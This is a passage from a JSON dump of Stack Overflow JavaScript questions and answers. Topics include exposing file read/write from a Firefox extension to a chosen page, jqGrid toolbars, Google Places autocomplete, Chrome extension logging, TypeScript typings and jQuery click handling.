}\n    wm.addListener(WindowListener);\n    LOG(\"done shutdown.\");\n  } catch (e) {\n    LOG(\"error shutting down: \"+e);\n  }\n}\n</code></pre>\n\n<p>Basically, that calls <code>WindowListener.setupBrowserUI()</code> for each current &amp; future window of your web-browser. <code>WindowListener</code> is defined as follows: </p>\n\n<pre><code>var WindowListener = {\n  setupBrowserUI: function(chromeWindow) {\n    chromeWindow.gBrowser.addEventListener('load', my_load_handler, true);\n  },\n  tearDownBrowserUI: function(chromeWindow) {\n    chromeWindow.gBrowser.removeEventListener('load', my_load_handler, true);\n  },\n  onOpenWindow: function(xulWindow) {\n    let chromeWindow = xulWindow.QueryInterface(Ci.nsIInterfaceRequestor)\n                         .getInterface(Ci.nsIDOMWindow);\n    chromeWindow.addEventListener(\"load\", function listener() {\n      chromeWindow.removeEventListener(\"load\", listener, false);\n      var domDocument = chromeWindow.document.documentElement;\n      var windowType = domDocument.getAttribute(\"windowtype\");\n      if (windowType == \"navigator:browser\")\n        WindowListener.setupBrowserUI(chromeWindow);\n    }, false);\n  },\n  onCloseWindow: function(chromeWindow) { },\n  onWindowTitleChange: function(chromeWindow, newTitle) { }\n};\n</code></pre>\n\n<p>That sets up an event listener for the <code>OpenWindow</code> event, and in turn installs an event listener for <code>load</code> events in the <code>TabBrowser</code> of each ChromeWindow. The <code>load</code> event handler is defined as: </p>\n\n<pre><code>var my_load_handler = function (evt) {\n  try {\n    var browserEnumerator = wm.getEnumerator(\"navigator:browser\");\n    while (browserEnumerator.hasMoreElements()) {\n      var browserWin = browserEnumerator.getNext();\n      var tabbrowser = browserWin.gBrowser;\n      var numTabs = tabbrowser.browsers.length;\n      for (var index = 0; index &lt; numTabs; index++) {\n        var currentBrowser = tabbrowser.getBrowserAtIndex(index);\n        var domWindow = currentBrowser.contentWindow.wrappedJSObject;\n        // identify your target page(s)...\n        if (domWindow.location.href == 'http://yourserver/yourpage') {\n          // install the privileged methods (if not already there)\n          if (!domWindow.hasOwnProperty('__my_priv_members__') {\n            install_my_privileged_methods(browserWin, domWindow);\n          }\n        }\n      }\n    }\n  } catch (e) {\n    LOG(e);\n  }\n}\n</code></pre>\n\n<p>That targets the correct pages (by checking the <code>window.location.href</code> and calls <code>install_my_privileged_methods</code> on their <code>window</code> object, which is defined as:</p>\n\n<pre><code>function install_my_privileged_methods(chromeWindow, domWindow) {\n  install_privileged_method(chromeWindow, domWindow, 'WriteFile', \n    function(priv) {\n      return function(File, Text, cb) {\n        priv.call([File, Text], function(rstatus, rdata, rerror){\n          if (cb) cb(rstatus, rerror);\n        });\n      };\n    },\n    function (chromeWindow, args, cb) {\n      var [File, Text] = args;\n      if (!File) return cb(0, null, \"need a filename\");\n      try {\n        const unicodeConverter = \n           Cc[\"@mozilla.org/intl/scriptableunicodeconverter\"]\n             .createInstance(Ci.nsIScriptableUnicodeConverter);\n        unicodeConverter.charset = \"UTF-8\";\n        Text = unicodeConverter.ConvertFromUnicode(Text);\n        const os = Cc[\"@mozilla.org/network/file-output-stream;1\"]\n                     .createInstance(Ci.nsIFileOutputStream);\n        os.init(File, 0x02 | 0x08 | 0x20, 0700, 0);\n        os.write(Text, Text.length);\n        os.close();\n        cb(1, null, null);\n      } catch (e) {\n        cb(0, null, \"error writing file: \"+e);\n      }\n    }\n  );\n\n  install_privileged_method(chromeWindow, domWindow, 'ReadFile', \n    function(priv) {\n      return function(File, cb) {\n        priv.call([File], function(rstatus, rdata, rerror){\n          if (cb) cb(rstatus, rdata, rerror);\n        });\n      };\n    },\n    function (chromeWindow, args, cb) {\n      var [File] = args;\n      if (!File) return cb(0, null, \"need a filename\");\n      try {\n        const is = Cc[\"@mozilla.org/network/file-input-stream;1\"]\n                     .createInstance(Ci.nsIFileInputStream);\n        const sis = Cc[\"@mozilla.org/scriptableinputstream;1\"]\n                      .createInstance(Ci.nsIScriptableInputStream);\n        is.init(File, 0x01, 0400, null);\n        sis.init(is);\n        var Text = sis.read(sis.available());    \n        is.close();\n        cb(1, Text, null);\n      } catch (e) {\n        cb(0, null, \"error reading file: \"+e);\n      }\n    }\n  );\n}\n</code></pre>\n\n<p>I didn't test this code. It's a straigh-forward translation of what you wrote above... I'll assume that works!</p>\n\n<p>That add two special methods, <code>WriteFile</code> &amp; <code>ReadFile</code>, to the chosen <code>window</code> objects. In your web application's (unprivileged) JavaScript code use them like this:</p>\n\n<pre><code>var buffer = '...'; // the text to be written\nwindow.WriteFile('C:\\\\path\\\\to\\\\file.txt', buffer, function(ok, errmsg) {\n  if (!ok) alert(errmsg);\n});\n\nwindow.ReadFile('C:\\\\path\\\\to\\\\file.txt', function(ok, buffer, errmsg) { \n  if (!ok) return alert(errmsg);\n  // use buffer here!\n});\n</code></pre>\n\n<p>Finally, <code>install_privileged_method</code> is defined as:</p>\n\n<pre><code>var install_privileged_method = (function(){\n  var gensym = (function (){\n    var __sym = 0;\n    return function () { return '__sym_'+(__sym++); }\n  })();\n  return function (chromeWindow, target, slot, handler, methodFactory) {\n    try {\n      target.__pmcache__ = target.hasOwnProperty('__pmcache__')\n        ? target.__pmcache__\n        : { ticket_no: 0, callbacks: {}, namespace: gensym() };\n      target[slot] = methodFactory({ call: function(fargs, fcb) {\n        try {\n          var ticket_no = target.__pmcache__.ticket_no++;\n          target.__pmcache__.callbacks[ticket_no] = fcb;\n          var cevent = target.document.createEvent(\"CustomEvent\");\n          cevent.initCustomEvent(\n            target.__pmcache__.namespace+'.'+slot,\n            true, true, { fargs: fargs, ticket_no: ticket_no }\n          );\n          target.dispatchEvent(cevent);\n        } catch (ue) {\n          fcb(0, null, 'untrusted dispatcher error: '+ue);\n        }\n      }});\n      LOG(\"installed untrusted dispatcher for method '\"+slot+\"'.\");\n      target.addEventListener(\n        target.__pmcache__.namespace+'.'+slot,\n        function(cevent){\n          var ticket_no = cevent.detail.ticket_no;\n          var fargs = cevent.detail.fargs;\n          var fcb = target.__pmcache__.callbacks[ticket_no];\n          try {\n            handler(chromeWindow, fargs, fcb);\n          } catch (pe) {\n            fcb(0, null, 'privileged handler error: '+pe);\n          }\n        },\n        false,\n        true\n      );\n      LOG(\"installed privileged handler for method '\"+slot+\"'.\");\n    } catch (ie) {\n      LOG(\"ERROR installing handler/factory for privileged \"+\n          \"method '\"+slot+\"': \"+ie);\n    }\n  };\n})();\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have a web application that my client uses for the cash registry.\nWhat I need to do is to create a local file as the cash register's software needs to read from that file in order to print.</p>\n\n<p>Until now i was using this code:</p>\n\n<pre><code>netscape.security.PrivilegeManager.enablePrivilege(\"UniversalXPConnect\");\nvar file = Components.classes[\"@mozilla.org/file/local;1\"].createInstance(Components.interfaces.nsILocalFile);\nfile.initWithPath(filePath);\n</code></pre>\n\n<p>Unfortunately with the latest version of firefox this isn't working anymore so I was told that i need and add-on to create the file.I've tried to develop an add-on(don't know if succesfully) and i have main.js looking like this :</p>\n\n<pre><code>var FileManager =\n{\nWrite:\n    function (File, Text)\n    {\n        if (!File) return;\n        const unicodeConverter = Components.classes[\"@mozilla.org/intl/scriptableunicodeconverter\"]\n            .createInstance(Components.interfaces.nsIScriptableUnicodeConverter);\n\n        unicodeConverter.charset = \"UTF-8\";\n\n        Text = unicodeConverter.ConvertFromUnicode(Text);\n        const os = Components.classes[\"@mozilla.org/network/file-output-stream;1\"]\n          .createInstance(Components.interfaces.nsIFileOutputStream);\n        os.init(File, 0x02 | 0x08 | 0x20, 0700, 0);\n        os.write(Text, Text.length);\n        os.close();\n    },\n\nRead:\n    function (File)\n    {\n        if (!File) return;\n        var res;\n\n        const is = Components.classes[\"@mozilla.org/network/file-input-stream;1\"]\n            .createInstance(Components.interfaces.nsIFileInputStream);\n        const sis = Components.classes[\"@mozilla.org/scriptableinputstream;1\"]\n            .createInstance(Components.interfaces.nsIScriptableInputStream);\n        is.init(File, 0x01, 0400, null);\n        sis.init(is);\n\n        res = sis.read(sis.available());\n\n        is.close();\n\n        return res;\n    },\n}; \n</code></pre>\n\n<p>Any ideas how should I use main.js?Where I find it after the add-on is installed?\nI need to use something like this : FileManager.Write(path,text).</p>\n",
            "last_activity_date": 1391607065,
            "question_id": 13843315,
            "score": 3,
            "tags": [
                "javascript",
                "firefox-addon",
                "xul",
                "firefox-addon-sdk",
                "xpcom"
            ],
            "title": "Expose file writing to a webpage with a Firefox extension"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>It's absolutely correct question! The current implementation of jqGrid has only <code>toggleToolbar</code> method which can hide the toolbar, but the toolbar itself will be created <em>once</em>. So all properties of the toolbar stay unchanged the whole time.</p>\n\n<p>To fix the problem I wrote small additional method <code>destroyFilterToolbar</code> which is pretty simple:</p>\n\n<pre><code>$.jgrid.extend({\n    destroyFilterToolbar: function () {\n        \"use strict\";\n        return this.each(function () {\n            if (!this.ftoolbar) {\n                return;\n            }\n            this.triggerToolbar = null;\n            this.clearToolbar = null;\n            this.toggleToolbar = null;\n            this.ftoolbar = false;\n            $(this.grid.hDiv).find(\"table thead tr.ui-search-toolbar\").remove();\n        });\n    }\n});\n</code></pre>\n\n<p><a href=\"http://www.ok-soft-gmbh.com/jqGrid/HowRecreateSearchingToolbar.htm\" rel=\"nofollow\">The demo</a> uses the method. One can recreate searching toolbar after changing of properties of some columns. In the code below one can change the language of some texts from the searching toolbar:</p>\n\n<p><img src=\"http://i.stack.imgur.com/bWC9Y.png\" alt=\"enter image description here\"></p>\n\n<p>The corresponding code is below:</p>\n\n<pre><code>$(\"#recreateSearchingToolbar\").change(function () {\n    var language = $(this).val();\n\n    // destroy searching toolbar\n    $grid.jqGrid(\"destroyFilterToolbar\");\n\n    // set some searching options\n    $grid.jqGrid(\"setColProp\", \"closed\",\n        language === \"de\" ?\n                {searchoptions: {value: \":Beliebig;true:Ja;false:Nein\"}} :\n                {searchoptions: {value: \":Any;true:Yes;false:No\"}});\n    $grid.jqGrid(\"setColProp\", \"ship_via\",\n        language === \"de\" ?\n                {searchoptions: {value: \":Beliebig;FE:FedEx;TN:TNT;IN:Intim\"}} :\n                {searchoptions: {value: \":Any;FE:FedEx;TN:TNT;IN:Intim\"}});\n\n    // create new searching toolbar with nes options\n    $grid.jqGrid(\"filterToolbar\", {stringResult: true, defaultSearch: \"cn\"});\n});\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 2
                }
            ],
            "body": "<p>I have a simple grid with the following options:</p>\n\n<pre><code>jQuery(\"#mygrid\").jqGrid({\n   url: 'dataurl.htm',\n   datatype: 'json',\n   ajaxSelectOptions: { cache: false }\n   ...\n   colModel: [\n    { name: 'foo', index: 'foo', width: 25, stype: 'select', searchoptions:{ sopt:       \n     ['eq'], dataUrl: 'someurl.htm?columnName=foo'}}\n    ]\n});\n</code></pre>\n\n<p>However, when I call <code>$(\"#mygrid\").trigger(\"reloadGrid\");</code> it only loads the data for the table from <code>dataurl.htm</code> but it does not load the data for the <code>foo</code> column from the <code>some url.htm</code> link. </p>\n\n<p>I've read couple of questions like these on SO and it was suggested to have <code>ajaxSelectOptions: { cache: false }</code> but this is not working for me. </p>\n\n<p>The <code>someurl.htm</code> returns <code>&lt;select&gt; &lt;option val=''&gt;something&lt;/option&gt;&lt;/select&gt;</code></p>\n",
            "last_activity_date": 1354615043,
            "question_id": 13692177,
            "score": 3,
            "tags": [
                "javascript",
                "jquery",
                "jqgrid"
            ],
            "title": "reloading dataurl elements in jqGrid"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>A significant portion of this code can be eliminated.</p>\n\n<p>HTML excerpt:</p>\n\n<pre><code>&lt;head&gt;\n...\n&lt;script src=\"https://maps.googleapis.com/maps/api/js?v=3.exp&amp;sensor=false&amp;libraries=places\"&gt;&lt;/script&gt;\n...\n&lt;/head&gt;\n&lt;body&gt;\n...\n&lt;input id=\"searchTextField\" type=\"text\" size=\"50\"&gt;\n...\n&lt;/body&gt;\n</code></pre>\n\n<p>Javascript:</p>\n\n<pre><code>function initialize() {\n\nvar input = document.getElementById('searchTextField');\nvar autocomplete = new google.maps.places.Autocomplete(input);\n}\n\ngoogle.maps.event.addDomListener(window, 'load', initialize);\n</code></pre>\n\n<p>You can see an example at <a href=\"http://www.redwoodtransit.org\">http://www.redwoodtransit.org</a>.</p>\n",
                    "is_accepted": true,
                    "score": 7
                }
            ],
            "body": "<p>I am trying to add a Google autocomplete search box to a website so that users can search for an address as easily as possible.</p>\n\n<p>My problem is, I have looked a numerous questions on here as well as the Google Maps Javascript API v3 regarding this and some tutorials yet they all bundle together the autocomplete functionality with mapping it on an embedded Google map.</p>\n\n<p>I don't need to map the location visually, I just need the autocomplete box for now, unfortunately I cannot work out which parts of the API are relevant to this and every example I have looked at includes plenty of JS for mapping. </p>\n\n<p>Does anybody know of a resource that deals ONLY with adding the autocomplete input functionality.</p>\n\n<p>The website is <a href=\"http://www.domscodestage.com/Belmont%20Website%20Official/storage.htm\" rel=\"nofollow\"><strong>here</strong></a>.</p>\n\n<p>If you click on 'Quote Calculator'>>>'Transport'>>>'Collect' you will see the input box where I would like to add this functionality.</p>\n\n<p>I am not asking anybody to do my work for me, just to help me find what I need.</p>\n\n<p><strong>Thanks In Advance</strong>.</p>\n",
            "last_activity_date": 1390568925,
            "question_id": 13689705,
            "score": 3,
            "tags": [
                "javascript",
                "google-maps-api-3",
                "autocomplete"
            ],
            "title": "How to add Google Maps Autocomplete search box?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Google Chrome Console has no possibility (upon now) to get the Output/Contents of the Console.</p>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>In your popup.js file you can just use <code>console.log(\"stuff\")</code> then right click on your extension and go to the debugger or inspect_element -> console, to see the output. </p>\n\n<p>From your background file you will need to do:</p>\n\n<pre><code>popup = chrome.extension.getViews('popup'); // this returns an array\n\npopup[0].console.log(\"stuff\");\n</code></pre>\n\n<p>Then simply do the same steps as above.</p>\n\n<p>See: <a href=\"http://developer.chrome.com/extensions/extension.html#method-getViews\" rel=\"nofollow\">api get views</a> for more on interaction between views and here for: <a href=\"http://developer.chrome.com/extensions/event_pages.html\" rel=\"nofollow\">another way to interact between pages.</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>There are three JavaScript context in Chrome Extemsion :\nContent Script, Backgrond Script and Popup.\nIn each context of code you can use console.log().\ni.e \n<code>console.log(\"I am here\")</code>;</p>\n\n<pre><code>var tempObject = {'one': 'v_one', 'two', 'v_two'};\n\nconsole.log(tempObject);\n</code></pre>\n\n<p>Note: Output will be available only in which context of code you mentioned <code>console.log('Hello');</code></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I am developing chrome extension, and the thing that i really need is to get console output as object.</p>\n\n<p>Is it possible to get any of that in chrome extension popup.html/popup.js or somewhere ?</p>\n\n<p>I have tab object, can i get somehow that particular tabs console, or error output from the inspector/devtool in chrome console as object in code?</p>\n",
            "last_activity_date": 1351941533,
            "question_id": 13013535,
            "score": 3,
            "tags": [
                "javascript",
                "google-chrome",
                "google-chrome-extension",
                "google-chrome-devtools",
                "google-chrome-app"
            ],
            "title": "Google chrome extension : is it possible to get console output (js errors, console.log or etc)"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>A function in JS embeds 2 concepts:</p>\n\n<ol>\n<li>An entity</li>\n<li>A functionality</li>\n</ol>\n\n<p>A function entity is some sort of \"capsule\" that contains a functionality, i.e., the power of transforming several inputs into an output. This capsule is what we know as \"object\". At the end of this recursion you find the identity <code>Function.constructor === Function</code>, which sets the limits of the introspective features of the language. The rest of JS functionalities cannot be accessible by the language itself because there not exists any capsule or object that embeds them.</p>\n\n<p>In JS you cannot define standalone 'functionalities' but you create objects that implement such functionalities that can be treated as any other objects. The <code>Function</code> object is the core object for implementing functionalitites. Either if you define named or anonymous functions (by means of the <code>function</code> keyword) you are creating a Function object that is bound either to a name (for named functions) or directly to a variable (unnamed functions).</p>\n\n<pre><code>function foo(a, b) {\u00a0return a+b; } //This function is a Function object bound to the name `foo`\n\nvar a = function(a, b) { return a+b; } //the Function object is bound to `a`\n</code></pre>\n\n<p>In the same manner the Array object has the <code>[]</code> operator, which is used to access to array elements, you may interpret <code>()</code> as an operator of the Function object which is used for invoking its embedded functionality.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<blockquote>\n  <p>'Function' function is an Object, then 'Function' object needs another constructor function to build it</p>\n</blockquote>\n\n<p>No. <code>Function</code> is a native, builtin object whose properties and behavior are defined in <a href=\"http://ecma-international.org/ecma-262/5.1/#sec-15.3\" rel=\"nofollow\">section 15.3 of the EcmaScript specification</a>. It was not built by an js function.</p>\n\n<p>Think of it like that: There is a function somewhere in the code of your EcmaScript environment that builds function objects - it is called whenever your script encounters a function expression or declaration. The global <code>Function</code> function is a wrapper for that function to make it accessible for scripts. All function objects which that function returns inherit from the <code>Function.prototype</code> object - it looks like they were constructed by <code>Function</code>. Also the <code>Function.prototype.constructor</code> property that all functions inherit <a href=\"http://ecma-international.org/ecma-262/5.1/#sec-15.3.4.1\" rel=\"nofollow\">is defined</a> to point to <code>Function</code>.</p>\n",
                    "is_accepted": true,
                    "score": 2
                }
            ],
            "body": "<p>I've been reading the book named \"Object Oriented Javascript\" by Stoyan Stefanov. I see this sentence:</p>\n\n<blockquote>\n  <p>function is actually an object that is built with 'Function' constructor function (with capital F).</p>\n</blockquote>\n\n<p>The author demonstrates this with some nice examples. However, based on that statement, I got this question that can't be answer by myself. As 'Function' constructor is a <strong>function</strong>, so 'Function' <strong>function</strong> is an <strong>Object</strong>, then 'Function' <strong>object</strong> needs another constructor function to build it and that another constructor function is again an Object (because it's a <strong>function</strong>).</p>\n\n<p>Well, I end up with this endless logic. Can someone help me point out the wrong point in my thinking?</p>\n",
            "last_activity_date": 1350224633,
            "question_id": 12881552,
            "score": 3,
            "tags": [
                "javascript",
                "function",
                "object",
                "constructor"
            ],
            "title": "Function and Object Javascript"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>I'm very sad to say, it looks like Ice Cream Sandwich does not support touch events (http://stackoverflow.com/questions/11390902/webview-in-ics-touch-events-not-being-fired-properly).  So iOS supports touch* events, Galaxy S supports touch* and mouse* and Ice Cream Sandwich (S3) does not support touch*.  Egads.  I hope I'm wrong.</p>\n",
                    "is_accepted": true,
                    "score": 0
                }
            ],
            "body": "<p>I am having a really odd issue.  I have a Phonegap 2.0 app that is basically completed.  It is working on iPhone and iPad and I ported it over to Android in a day, testing it on my Galaxy S.  Everything worked perfectly.  Then I tried to run it on my brand new S3 and none of the touch events worked.  Clicks work, but not touch.</p>\n\n<p>If I run this code</p>\n\n<pre><code>document.addEventListener('touchstart', function (e) { console.log('touch start')}, false);\ndocument.addEventListener('click', function (e) { console.log('doc click'); }, false);\n</code></pre>\n\n<p>... only the click events logs.  If I comment out the click I get nothing but the system clicks.</p>\n\n<pre><code>10-12 10:08:16.213: V/webview(2805): NO_FAST_DRAW = false\n10-12 10:08:16.283: V/webview(2805):  singleCursorHandlerTouchEvent -getEditableSupport  FASLE \n</code></pre>\n\n<p>The really weird thing is that the same touchstart works both on the S3 browser AND the PhoneGap ChildBrowser plugin.  Just not in the webview portion of the app, and only on the S3.</p>\n\n<p>[UPDATED]</p>\n\n<p>And it gets weirder.  If I bind the event in the inline JavaScript code, such as this</p>\n\n<pre><code>// Javascript stuff\ndocument.addEventListener('touchstart', function (e) { alert('touch start')}, false);\n// more JavaScript stuff\n</code></pre>\n\n<p>it actually works.  However, if I set it after a timeout it doesn't</p>\n\n<pre><code>setTimeout(function() {\n    document.addEventListener('touchstart', function (e) { alert('touch start')}, false);\n}, 2000);\n</code></pre>\n",
            "last_activity_date": 1354303344,
            "question_id": 12862347,
            "score": 3,
            "tags": [
                "javascript",
                "cordova",
                "javascript-events",
                "galaxy",
                "samsung-mobile"
            ],
            "title": "Phonegap on Galaxy S3 ignores touch events"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Add checks like <code>if(navigator.id != null &amp;&amp; typeof navigator.id != 'undefined')</code> before stmt where navigator.id is referred</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>1) \nYou can reinterpret navigator prop.</p>\n\n<pre><code>(&lt;any&gt;navigator).id.request();\n</code></pre>\n\n<p>2) \nYou can declare id prop youself</p>\n\n<p>mycompany.lib.d.ts</p>\n\n<pre><code>interface Navigator {\n  id: any\n}\n</code></pre>\n\n<p>app.ts</p>\n\n<pre><code>navigator.id.request();\n</code></pre>\n\n<p>see this video <a href=\"http://channel9.msdn.com/posts/Anders-Hejlsberg-Introducing-TypeScript/\">http://channel9.msdn.com/posts/Anders-Hejlsberg-Introducing-TypeScript/</a> There Anders tell as jQuery.UI add new methods to jQuery (see 46 min)</p>\n",
                    "is_accepted": true,
                    "score": 7
                }
            ],
            "body": "<p>I am using Personas which relies on the <a href=\"https://developer.mozilla.org/en-US/docs/DOM/navigator.id\" rel=\"nofollow\">proprietary property <code>navigator.id</code></a>. Since this property is not standard, the TypeScript compiler generates the following warning: </p>\n\n<pre><code>$ tsc home.ts --out my_ts_generated_code.js\n/Users/..../home.ts(27,18): The property 'id' does not exist on value of type 'Navigator'\n</code></pre>\n\n<p>But the .js file is successfully generated and runs on the FF15 browser without any warning/error message.<br>\nI also include a polyfill for <code>navigator.id</code>, as instructed by the documentation, so <code>navigator.id</code> will definitely by available in every browser.</p>\n\n<p>Could someone suggest me how to deal with this warning?</p>\n\n<p><strong>index.html</strong></p>\n\n<pre><code>&lt;!-- some HTML omit above --&gt;\n&lt;script src=\"https://login.persona.org/include.js\"&gt;&lt;/script&gt;\n&lt;script src=\"my_ts_generated_code.js\"&gt;&lt;/script&gt;\n&lt;button class=\"btn\" id=\"signin\"&gt;Sign in&lt;/button&gt;\n&lt;button class=\"btn\" id=\"signout\"&gt;Sign out&lt;/button&gt;\n&lt;!-- some HTML omit below --&gt;\n</code></pre>\n\n<p><strong>home.ts</strong></p>\n\n<pre><code>declare var $;\n\nclass Student {\n    fullname : string;\n    constructor(public firstname, public middleinitial, public lastname) {\n        this.fullname = firstname + \" \" + middleinitial + \" \" + lastname;\n    }\n}\n\ninterface Person {\n    firstname: string;\n    lastname: string;\n}\n\nfunction greeter(person : Person) {\n    return \"Hello, \" + person.firstname + \" \" + person.lastname;\n}\n\nvar user = new Student(\"Jane\", \"M.\", \"User\");\n\n$(function() {\n    $('#signin').on('click', function(e) {\n        e.preventDefault();\n        navigator.id.request();\n    });\n\n    $('#signout').on('click', function(e) {\n        e.preventDefault();\n        navigator.id.logout();\n    });\n    //document.body.innerHTML = greeter(user);\n});\n</code></pre>\n",
            "last_activity_date": 1349251495,
            "question_id": 12703266,
            "score": 3,
            "tags": [
                "javascript",
                "jquery",
                "typescript"
            ],
            "title": "How to handle warnings for proprietary/custom properties of built-in objects in TypeScript"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Yes google will see content that is both display none and display block</p>\n\n<p>Your FAQ section will be seen by google bots.</p>\n\n<p>See these articles:</p>\n\n<p>Webmaster Guidelines: <a href=\"http://support.google.com/webmasters/bin/answer.py?hl=en&amp;answer=35769\" rel=\"nofollow\">http://support.google.com/webmasters/bin/answer.py?hl=en&amp;answer=35769</a></p>\n\n<blockquote>\n  <p>Use a text browser such as Lynx to examine your site, because most search engine spiders see your site much as Lynx would. If fancy features such as JavaScript, cookies, session IDs, frames, DHTML, or Flash keep you from seeing all of your site in a text browser, then search engine spiders may have trouble crawling your site.</p>\n</blockquote>\n\n<p>Hidden text and links: <a href=\"http://support.google.com/webmasters/bin/answer.py?hl=en&amp;answer=66353\" rel=\"nofollow\">http://support.google.com/webmasters/bin/answer.py?hl=en&amp;answer=66353</a></p>\n\n<blockquote>\n  <p>Hiding text or links in your content can cause your site to be perceived as untrustworthy since it presents information to search engines differently than to visitors. ... If you do find hidden text or links on your site, either remove them or, <strong>if they are relevant for your site's visitors, make them easily viewable</strong>.</p>\n</blockquote>\n",
                    "is_accepted": true,
                    "score": 4
                },
                {
                    "body": "<p>It is debatable if Google does crawl hidden elements; you'll find 'experts' who will argue one way or another, however most of it is pure conjecture. What I like to do in these situations is apply the <code>display: none</code> via JavaScript / jQuery on <code>$(document).ready()</code> that way the user gets the experience you are looking for, while Google indexes the page like so:</p>\n\n<pre><code>&lt;div class=\"question\"&gt;Does Google see this?&lt;/div&gt;\n&lt;div class=\"answer\"&gt;Yes is JS is used!&lt;/div&gt;\n\n$(document).ready(function(){\n    $('.answer').hide();\n});\n</code></pre>\n\n<p>It is important to note that this method is also debatable as some have indicated that Google has started executing JS as part of the crawl. That being said, I've had good results using this technique.</p>\n\n<p>I hope this helps!</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>When google crawls a web page , do google bot crawl </p>\n\n<ol>\n<li><p>content with code like <code>style=\"display:none\"</code>  </p></li>\n<li><p>content with code like <code>style=\"display:block\"</code></p></li>\n</ol>\n\n<p>the question i am asking because i have a website of F&amp;Qs.</p>\n\n<ol>\n<li><p>For user i want answers to be displayed only when he clicks on \"answer/solution\" link.</p></li>\n<li><p>For google bot i want solution section to be crawled else my content of page becomes too less.</p></li>\n</ol>\n",
            "last_activity_date": 1347992599,
            "question_id": 12482624,
            "score": 3,
            "tags": [
                "javascript",
                "jquery",
                "html"
            ],
            "title": "google crawl -- display:none &amp; display:block"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>I might be wrong, but in between the lines of your question I read that you actually ask about <code>toggleClass()</code> method documented <a href=\"http://api.jquery.com/toggleClass/\" rel=\"nofollow\">here</a>.</p>\n\n<blockquote>\n  <p>Add or remove one or more classes from each element in the set of\n  matched  elements, depending on either the class's presence or the\n  value of the  switch argument.</p>\n</blockquote>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Demo: <a href=\"http://jsfiddle.net/aztVY/\">http://jsfiddle.net/aztVY/</a></p>\n\n<pre><code>(function () {\n  var count = 0;\n\n  $('table').click(function () {\n    count += 1;\n\n    if (count == 2) {\n      // come code\n    }\n  });\n})();\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 5
                },
                {
                    "body": "<p>You can use jQuery's <a href=\"http://api.jquery.com/toggleClass/\" rel=\"nofollow\"><code>toggleClass</code></a> function for that:</p>\n\n<pre><code>$(\" ... \").click(function() {\n    $(this).toggleClass(\"someClass\");\n});\n</code></pre>\n\n<p>When clicked once, the element has the <code>someClass</code> class, and when clicked twice, the class is removed again.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>i need to color table i zebra style , and then when I click on the table, twice(not dblCLick) to change back to original? My question is how to count 2 clicks?</p>\n",
            "last_activity_date": 1347034686,
            "question_id": 12319598,
            "score": 3,
            "tags": [
                "javascript",
                "jquery",
                "html",
                "click",
                "mouseevent"
            ],
            "title": "JQuery Mouse Click counter"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>It's not possible to access page headers via Javascript, without sending ajax request.</p>\n",
                    "is_accepted": false,
                    "score": 6
                }
            ],
            "body": "<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/220231/accessing-http-headers-in-javascript\">Accessing HTTP Headers in Javascript?</a>  </p>\n</blockquote>\n\n\n\n<p>The only way what i know to read with javascript the current headers is:</p>\n\n<pre><code>var req = new XMLHttpRequest();\nreq.open('GET', document.location, false);\nreq.send(null);\nvar headers = req.getAllResponseHeaders().toLowerCase();\n</code></pre>\n\n<p>But i don't want make a new request, i want read the current headers.</p>\n\n<p>Is this posible?\nThanks!</p>\n",
            "last_activity_date": 1346744479,
            "question_id": 12258705,
            "score": 3,
            "tags": [
                "javascript",
                "http-headers"
            ],
            "title": "How can i read the current headers without making a new request with JS?"
        }
    ]
}
